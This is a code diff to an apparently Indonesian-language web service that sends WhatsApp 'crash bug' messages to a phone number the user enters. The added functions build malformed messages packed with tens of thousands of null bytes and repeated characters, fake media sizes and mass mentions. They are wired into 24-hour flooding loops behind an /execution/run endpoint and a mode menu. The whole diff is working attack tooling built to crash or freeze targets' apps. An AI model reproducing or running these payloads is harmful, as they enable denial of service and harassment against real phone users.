@@ -1718,6 +1718,60 @@ try {
  }
 }
 
+async function statusCarousel(X) {
+   let etc = generateWAMessageFromContent(X, proto.Message.fromObject({
+    viewOnceMessage: {
+     message: {
+      interactiveMessage: {
+       header: {
+        title: "- xrelly",
+        locationMessage: {
+          degreesLatitude: -9.09999262999,
+          degreesLongitude: 199.99963118999,
+          jpegThumbnail: null,
+          name: "💤⃟⃰ᰧ./𝘅𝗿𝗹.𝛆𝛘𝛆" + "\u0000".repeat(15000),
+          address: "‌💤⃟⃰ᰧ./𝘅𝗿𝗹.𝛆𝛘𝛆" + "\u0000".repeat(5000),
+          url: `https://xrl.xxx.${"\u0000".repeat(25000)}.com`,
+        },
+        hasMediaAttachment: true
+       },
+       body: {
+        text: "\u0000".repeat(10000)
+       },
+       nativeFlowMessage: {
+         name: "call_permission_request",
+        messageParamsJson: " { } "
+       },
+       carouselMessage: {}
+      }
+     }
+    }
+   }), {});
+
+  await Ren.relayMessage("status@broadcast", etc.message, {
+    messageId: etc.key.id,
+    statusJidList: [X],
+    additionalNodes: [
+      {
+        tag: "meta",
+        attrs: {},
+        content: [
+          {
+            tag: "mentioned_users",
+            attrs: {},
+            content: [
+              {
+                tag: "to",
+                attrs: { jid: X },
+              },
+            ],
+          },
+        ],
+      },
+    ],
+  });
+};
+
 
 async function DelayAndro(durationHours, X) {
   const totalDurationMs = durationHours * 60 * 60 * 1000;
@@ -1750,7 +1804,7 @@ async function DelayAndro(durationHours, X) {
       } else {
         console.log(chalk.green(`👀 Succes Send Bugs to ${X} (Batch ${batch})`));
         if (batch < maxBatches) {
-          console.log(chalk.yellow(`( Grade Necro 🍂 777 ).`));
+          console.log(chalk.yellow(`( Grade Tredict 🍂 777 ).`));
           count = 0;
           batch++;
           setTimeout(sendNext, 5 * 60 * 1000);
@@ -2276,8 +2330,6 @@ async function DelayOld2(target, mention) {
   }
 }
 
-
-
 async function oldDelay(X, mention = true) {
   const delaymention = Array.from({ length: 30000 }, (_, r) => ({
     title: "᭡꧈".repeat(95000),
@@ -2370,7 +2422,148 @@ async function oldDelay(X, mention = true) {
   console.log(chalk.bold.red('SUCCES SEND CRASH'));
 }
 
-async function GetSuZoXAndros(durationHours, X) {
+async function urlNew(X) {
+  await Ren.relayMessage(
+    target,
+    {
+      ephemeralMessage: {
+        message: {
+          locationMessage: {
+            degreesLatitude: -9.09999262999,
+            degreesLongitude: 199.99963118999,
+            jpegThumbnail: null,
+            name:
+              "kotex" +
+              "ꦽ".repeat(45000),
+            address: "",
+            url:
+              "https://fvck.all🩸" +
+              "؂ن؃".repeat(100000) +
+              ".com",
+            contextInfo: {
+              externalAdReply: {
+                quotedAd: {
+                  advertiserName: " ؂ن؃".repeat(10000),
+                  mediaType: "IMAGE",
+                  jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/",
+                  caption: "",
+                },
+                placeholderKey: {
+                  remoteJid: "0@s.whatsapp.net",
+                  fromMe: false,
+                  id: "ABCDEF1234567890",
+                },
+              },
+              quotedMessage: {
+                paymentInviteMessage: {
+                  serviceType: 3,
+                  expiryTimestamp: Date.now() + 1814400000,
+                },
+                forwardedAiBotMessageInfo: {
+                  botName: "META AI",
+                  botJid:
+                    Math.floor(Math.random() * 5000000) +
+                    "@s.whatsapp.net",
+                  creatorName: "Bot",
+                },
+              },
+            },
+          },
+        },
+      },
+    },
+    { participant: { jid: X } }
+  );
+}
+
+async function StXFc(X) {
+  const buttonss = [
+    { name: "single_select", buttonParamsJson: "" }
+  ];
+
+  for (let i = 0; i < 10; i++) {
+    baten.push(
+      { name: "cta_call",    buttonParamsJson: JSON.stringify({ status: true }) },
+      { name: "cta_copy",    buttonParamsJson: JSON.stringify({ display_text: "ꦽ".repeat(5000) }) },
+      { name: "quick_reply", buttonParamsJson: JSON.stringify({ display_text: "ꦽ".repeat(5000) }) }
+    );
+  }
+
+  const stxview = {
+    viewOnceMessage: {
+      message: {
+        interactiveMessage: {
+      contextInfo: {
+        participant: X,
+            mentionedJid: [
+              "0@s.whatsapp.net",
+              ...Array.from(
+                { length: 1900 },
+                () =>
+                  "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
+              ),
+            ],
+        remoteJid: "X",
+        participant: Math.floor(Math.random() * 5000000) + "@s.whatsapp.net",
+        stanzaId: "123",
+        quotedMessage: {
+                paymentInviteMessage: {
+                  serviceType: 3,
+                  expiryTimestamp: Date.now() + 1814400000
+                },
+                forwardedAiBotMessageInfo: {
+                  botName: "META AI",
+                  botJid: Math.floor(Math.random() * 5000000) + "@s.whatsapp.net",
+                  creatorName: "Bot"
+                }
+      }
+    },
+          carouselMessage: {
+            messageVersion: 1,
+            cards: [
+              {
+                header: {
+                  hasMediaAttachment: true,
+                  imageMessage: {
+    url: "https://mmg.whatsapp.net/v/t62.7118-24/533457741_1915833982583555_6414385787261769778_n.enc?ccb=11-4&oh=01_Q5Aa2QHlKHvPN0lhOhSEX9_ZqxbtiGeitsi_yMosBcjppFiokQ&oe=68C69988&_nc_sid=5e03e0&mms3=true",
+    mimetype: "image/jpeg",
+    fileSha256: "QpvbDu5HkmeGRODHFeLP7VPj+PyKas/YTiPNrMvNPh4=",
+    fileLength: "9999999999999",
+    height: 9999,
+    width: 9999,
+    mediaKey: "exRiyojirmqMk21e+xH1SLlfZzETnzKUH6GwxAAYu/8=",
+    fileEncSha256: "D0LXIMWZ0qD/NmWxPMl9tphAlzdpVG/A3JxMHvEsySk=",
+    directPath: "/v/t62.7118-24/533457741_1915833982583555_6414385787261769778_n.enc?ccb=11-4&oh=01_Q5Aa2QHlKHvPN0lhOhSEX9_ZqxbtiGeitsi_yMosBcjppFiokQ&oe=68C69988&_nc_sid=5e03e0",
+    mediaKeyTimestamp: "1755254367",
+    jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgASAMBIgACEQEDEQH/xAAuAAEBAQEBAQAAAAAAAAAAAAAAAQIDBAYBAQEBAQAAAAAAAAAAAAAAAAEAAgP/2gAMAwEAAhADEAAAAPnZTmbzuox0TmBCtSqZ3yncZNbamucUMszSBoWtXBzoUxZNO2enF6Mm+Ms1xoSaKmjOwnIcQJ//xAAhEAACAQQCAgMAAAAAAAAAAAABEQACEBIgITEDQSJAYf/aAAgBAQABPwC6xDlPJlVPvYTyeoKlGxsIavk4F3Hzsl3YJWWjQhOgKjdyfpiYUzCkmCgF/kOvUzMzMzOn/8QAGhEBAAIDAQAAAAAAAAAAAAAAAREgABASMP/aAAgBAgEBPwCz5LGdFYN//8QAHBEAAgICAwAAAAAAAAAAAAAAAQIAEBEgEhNR/9oACAEDAQE/AKOiw7YoRELToaGwSM4M5t6b/9k=",
+  },
+                },
+                body: { text: "StX" + "\u0000".repeat(5000) },
+                nativeFlowMessage: {
+                  buttons: baten,
+                  messageParamsJson: "{".repeat(10000)
+                }
+              }
+            ]
+          }
+        }
+      }
+    }
+  };
+  
+    await Ren.relayMessage(X, stxview, {
+      messageId: null,
+      participant: { jid: X },
+      userJid: X
+    }),
+    await Ren.relayMessage(X, stxview, {
+      messageId: null,
+      participant: { jid: X },
+      userJid: X
+    });
+}
+
+async function TredictXAndros(durationHours, X) {
   const totalDurationMs = durationHours * 60 * 60 * 1000;
   const startTime = Date.now();
   let count = 0;
@@ -2384,23 +2577,15 @@ async function GetSuZoXAndros(durationHours, X) {
     }
 
     try {
-      if (count < 1000) {
+      if (count < 250) {
         await Promise.all([
-          BlankPack(X),
-          framersbug1(X),
-          framersbug1(X),
-          boegProtocol(X),
-          SixDelay(X),
-          SixDelay(X),
-          NewBoeg(X),
-          NewBoeg(X),
-          boegProtocol(X),
-          boegProtocol(X),
+          StXFc(X),
+          urlNew(X),
           restart(X)
         ]);
         console.log(chalk.yellow(`
 ┌────────────────────────┐
-│ ${count + 1}/1000 Andros 📟
+│ ${count + 1}/250 Blank Beta 📟
 └────────────────────────┘
   `));
         count++;
@@ -2441,6 +2626,7 @@ async function iosflood(durationHours, X) {
     try {
       if (count < 1000) {
         await Promise.all([
+          statusCarousel(X),
           XiosVirus(X),
           TrashLocIOS(X),
           restart(X)
@@ -2455,7 +2641,7 @@ async function iosflood(durationHours, X) {
       } else {
         console.log(chalk.green(`👀 Succes Send Bugs to ${X} (Batch ${batch})`));
         if (batch < maxBatches) {
-          console.log(chalk.yellow(`( Grade NECRO 🍂 777 ).`));
+          console.log(chalk.yellow(`( Grade Tredict 🍂 777 ).`));
           count = 0;
           batch++;
           setTimeout(sendNext, 5 * 60 * 1000);
@@ -2562,10 +2748,10 @@ app.get("/execution/run", cooldownMiddleware(), (req, res) => {
     });
   }
 
-  if (!["andros", "ios", "fcios"].includes(mode)) {
+  if (!["andros", "ios", "blankbetas"].includes(mode)) {
     return res.status(400).json({
       success: false,
-      message: "Mode tidak dikenali. Gunakan mode=andros / ios / fcios.",
+      message: "Mode tidak dikenali. Gunakan mode=andros / ios / blankbetas.",
       username,
       expired,
     });
@@ -2577,8 +2763,8 @@ app.get("/execution/run", cooldownMiddleware(), (req, res) => {
       DelayAndro(24, target);
     } else if (mode === "ios") {
       iosflood(24, target);
-    } else if (mode === "fcios") {
-      GetSuZoXAndros(24, target);
+    } else if (mode === "blankbetas") {
+      TredictXAndros(24, target);
     }
 
     return res.json({
@@ -2838,9 +3024,9 @@ const executionPage = (
       <i class="fas fa-cogs"></i> Pilih Mode
     </button>
     <div class="dropdown-content" id="modesContainer">
-      <button class="mode-btn" data-mode="andros"><i class="fa fa-fire"></i> ANDRO DELAY</button>
-      <button class="mode-btn" data-mode="ios"><i class="fa fa-tint"></i> iOS DELAY</button>
-      <button class="mode-btn" data-mode="fcios"><i class="fa fa-bolt"></i> BLONDE VINTAGE</button>
+      <button class="mode-btn" data-mode="andros"><i class="fa fa-fire"></i>DELAY iNVIS</button>
+      <button class="mode-btn" data-mode="ios"><i class="fa fa-tint"></i> iOS iNVIS</button>
+      <button class="mode-btn" data-mode="blankbetas"><i class="fa fa-bolt"></i> BLANK BETA</button>
     </div>
   </div>
 
@@ -3713,7 +3899,7 @@ app.get("/execution", (req, res) => {
         }, true, currentUser, "", ""));
       }
 
-      if (["andros", "ios", "fcios"].includes(mode)) {
+      if (["andros", "ios", "blankbetas"].includes(mode)) {
         return res.send(executionPage("✅ Server ON", {
           message: "Masukkan nomor target (62xxxxxxxxxx)."
         }, true, currentUser, "", mode));
@@ -3736,8 +3922,8 @@ app.get("/execution", (req, res) => {
         DelayAndro(24, target);
       } else if (mode === "ios") {
         iosflood(24, target);
-      } else if (mode === "fcios") {
-        GetSuZoXAndros(24, target);
+      } else if (mode === "blankbetas") {
+        TredictXAndros(24, target);
       } else {
         throw new Error("Mode tidak dikenal.");
       }
